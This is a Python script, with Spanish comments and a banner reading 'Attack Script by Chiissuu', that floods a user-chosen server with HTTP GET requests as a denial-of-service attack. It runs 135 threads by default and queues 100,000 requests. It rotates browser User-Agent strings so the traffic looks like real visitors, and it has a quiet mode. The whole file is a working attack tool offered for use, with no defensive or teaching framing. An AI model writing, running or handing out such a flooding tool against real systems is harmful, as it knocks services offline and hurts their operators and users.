#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# 1 · Importaciones.
import sys
import socket
import threading
import random
from queue import Queue
from optparse import OptionParser

# 2 · Banner.
print('''
☠️☠️☠️☠️☠️☠ Ddos ☠️☠️☠️☠️☠️☠

    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    Attack Script by Chiissuu
    
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
☠️☠️☠️☠️☠️☠☠️☠️☠️☠️☠️☠☠️☠️☠
''')

# 3 · Variables globales.
host = ''
port = 80
turbo = 135
quiet = False
queue = Queue()

# 4 · Devuelve una lista de User-Agent para simular navegadores reales.
def build_user_agents():
    uas = []
    uas.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/72.0 Safari/537.36")
    uas.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
    uas.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 "
               "(KHTML, like Gecko) Version/12.1.1 Safari/605.1.15")
    return uas

# 5 · Envía repetidamente peticiones HTTP GET para generar carga en el objetivo.
def down_it(item):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        ua = random.choice(build_user_agents())
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n\r\n"
        )
        s.send(request.encode('utf-8'))
        s.shutdown(socket.SHUT_WR)
        if not quiet:
            print(f"[+] Paquete enviado a {host}:{port}")
        s.close()
    except Exception as e:
        if not quiet:
            print(f"[-] Error al enviar el paquete: {e}")

# 6 · Función del hilo trabajador
def dos():
    while True:
        item = queue.get()
        down_it(item)
        queue.task_done()

# 7 · Mostrar un menu con las instrucciones de uso.
def usage():
    print('''
Uso: python3 ddosripper.py -s <servidor> [-p <puerto>] [-t <hilos>] [-q]
Opciones:
  -h, --help          Muestra esta ayuda y sale
  -s, --server        IP o nombre del servidor objetivo (obligatorio)
  -p, --port          Puerto TCP (por defecto 80)
  -t, --turbo         Número de hilos (por defecto 135)
  -q, --quiet         Modo silencioso (sin salida por pantalla)
''')

# 8 · Procesa los parámetros de la línea de comandos.
def get_parameters():
    global host, port, turbo, quiet
    parser = OptionParser()
    parser.add_option('-s', '--server', dest='host',
                      help='IP o nombre del servidor objetivo')
    parser.add_option('-p', '--port', dest='port', type='int', default=80,
                      help='Puerto objetivo (por defecto 80)')
    parser.add_option('-t', '--turbo', dest='turbo', type='int', default=135,
                      help='Número de hilos (por defecto 135)')
    parser.add_option('-q', '--quiet', dest='quiet',
                      action='store_true', default=False,
                      help='Modo silencioso (sin imprimir mensajes)')
    (options, args) = parser.parse_args()
    if not options.host:
        usage()
        sys.exit(1)
    host = options.host
    port = options.port
    turbo = options.turbo
    quiet = options.quiet

# 9 · Función principal que inicializa el ataque.
def main():
    get_parameters()
    print(f"Iniciando ataque a {host}:{port} con {turbo} hilos.")
    for i in range(turbo):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
    try:
        # Se generan tareas para provocar envíos masivos de solicitudes
        for i in range(100000):
            queue.put(i)
        queue.join()
    except KeyboardInterrupt:
        print("\nAtaque detenido por el usuario.")
        sys.exit()

# 10 · Ejecutar la entrada si el archivo se ejecuta directamnete.
if __name__ == '__main__':
    main()
